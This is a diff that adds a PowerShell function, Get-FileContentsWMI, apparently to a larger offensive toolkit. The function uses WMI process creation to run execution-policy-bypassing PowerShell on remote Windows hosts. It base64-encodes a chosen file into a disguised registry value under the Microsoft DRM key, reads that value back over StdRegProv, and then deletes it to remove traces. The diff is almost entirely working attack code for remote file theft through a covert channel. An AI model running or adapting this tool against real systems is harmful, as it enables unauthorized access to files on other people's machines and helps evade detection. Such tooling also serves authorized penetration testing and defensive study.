@@ -1824,3 +1824,121 @@ function Invoke-DirectoryListing
     }
     end{}
 }
+
+function Get-FileContentsWMI
+{
+    <#
+    .SYNOPSIS
+    This function attempts to read a file's contents and display it to you over WMI.
+
+    .DESCRIPTION
+    This function attempts to read a file's contents and display it to you over WMI by running powershell on the remote system.
+
+    .PARAMETER User
+    Specify a username. Default is the current user context.
+
+    .PARAMETER Pass
+    Specify the password for the appropriate user.
+
+    .PARAMETER Targets
+    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.
+
+    .PARAMETER File
+    File that you'd like to have the contents of/read
+
+    .EXAMPLE
+    > Get-FileContentsWMI -Targets win7pc2 -User test\chris -Pass Chris -File C:\file.txt
+    This commands uses the credentials provided to read the file C:\file.txt from the win7pc2 system and display its contents to the console.
+
+    .EXAMPLE
+    > Get-FileContentsWMI -Targets win7pc2 -File C:\file2.txt
+    This commands uses the context of the current user to read the file C:\file2.txt from the win7pc2 system and display its contents to the console.
+
+    #>
+
+    param
+    (
+        #Parameter assignment
+        [Parameter(Mandatory = $False)]
+        [string]$User,
+        [Parameter(Mandatory = $False)] 
+        [string]$Pass,
+        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)] 
+        [string[]]$Targets = ".",
+        [Parameter(Mandatory = $False)] 
+        [string]$File
+    )
+
+    Process
+    {
+        $fullregistrypath = "HKLM:\Software\Microsoft\DRM"
+        $registrydownname = "ReadMe"
+        # The reghive value is for hkey_local_machine
+        $reghive = 2147483650
+        $regpath = "SOFTWARE\Microsoft\DRM"
+        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
+        if($User -and $Pass)
+        {
+            # This block of code is executed when starting a process on a remote machine via wmi
+            $password = ConvertTo-SecureString $Pass -asplaintext -force 
+            $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
+            Foreach($computer in $TARGETS)
+            {
+                # On remote system, save file to registry
+                Write-Verbose "Reading remote file and writing on remote registry"
+                $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
+                $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'
+                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -Credential $cred -Computername $computer
+                Write-Verbose "Sleeping to let remote system read and store file"
+                Start-Sleep -s 15
+
+                # Grab file from remote system's registry
+                Write-Verbose "Reading file from remote registry"
+                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -Computer $computer -Credential $cred
+                $decode = [System.Convert]::FromBase64String($remote_reg.sValue)
+                # Print to console
+                $enc = [System.Text.Encoding]::ASCII
+                $enc.GetString($decode)
+
+                # Removing Registry value from remote system
+                Write-Verbose "Removing registry value from remote system"
+                Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -Computer $computer -Credential $cred
+
+                Write-Verbose "Done!"
+            }
+        }
+
+        elseif(($Targets -ne ".") -and !$User)
+        {
+            # user didn't enter creds. Assume using local user priv has local admin access to Targets
+            # Thanks Evan for catching this
+            Foreach($computer in $TARGETS)
+            {
+                # On remote system, save file to registry
+                Write-Verbose "Reading remote file and writing on remote registry"
+                $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
+                $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'
+                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -Computername $computer
+                Write-Verbose "Sleeping to let remote system read and store file"
+                Start-Sleep -s 15
+
+                # Grab file from remote system's registry
+                Write-Verbose "Reading file from remote registry"
+                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -Computer $computer
+                $decode = [System.Convert]::FromBase64String($remote_reg.sValue)
+                # Print to console
+                $enc = [System.Text.Encoding]::ASCII
+                $enc.GetString($decode)
+
+                # Removing Registry value from remote system
+                Write-Verbose "Removing registry value from remote system"
+                Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -Computer $computer
+
+                Write-Verbose "Done!"
+            }
+        }
+        
+    }
+
+    end{}
+}
